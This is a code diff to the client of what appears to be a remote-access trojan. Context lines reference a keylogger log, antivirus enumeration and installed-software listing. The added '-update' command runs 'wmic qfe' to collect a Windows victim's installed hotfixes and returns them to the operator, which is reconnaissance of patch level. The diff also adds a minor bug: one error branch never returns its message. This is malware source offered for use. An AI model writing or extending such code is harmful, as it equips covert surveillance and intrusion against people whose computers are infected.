@@ -753,6 +753,29 @@ class Client:
                 response = '\nHas not possible to open the keylogger log.\n'
                 time.sleep(2)
                 return response
+                
+        elif '-update' in command:
+            if 'windows' in str(platform.platform()).lower():
+                try:
+                    output = str(subprocess.check_output(['wmic', 'qfe', 'get', 'Description,', 'HotFixID,', 'InstalledOn'])).split('\\r\\r\\n')[1:-2]
+                    count = 0
+                    d = dict()
+                    for x in output:
+                        x = x.split()
+                        d[count] = {'Description': x[0], 'HotFixID': x[1], 'InstalledOn': x[2]}
+                        count += 1
+                    cont_lst = f'[@%HOST_SHELL%@]'
+                    for x in d.values():
+                        for k, v in x.items():
+                            cont_lst += f'{k}: {v}\n'
+                        cont_lst += f'\n'
+                    print(cont_lst)
+                    return cont_lst
+                except:
+                    f'[@HOST_SHELL%@]An error was occurred'
+            else:
+                return f'[@HOST_SHELL%@]Not windows'
+            
         elif '-antivirus' in command:
             if 'windows' in str(platform.platform()).lower():
                 try:
@@ -778,9 +801,9 @@ class Client:
 
                     return clean
                 except:
-                    return 'error'
+                    return f'[@HOST_SHELL%@]An error was occurred'
             else:
-                return 'not windows'
+                return f'[@HOST_SHELL%@]Not windows'
 
         elif '@%list-softwares%@' in command:
             if 'windows' in str(platform.platform()).lower():
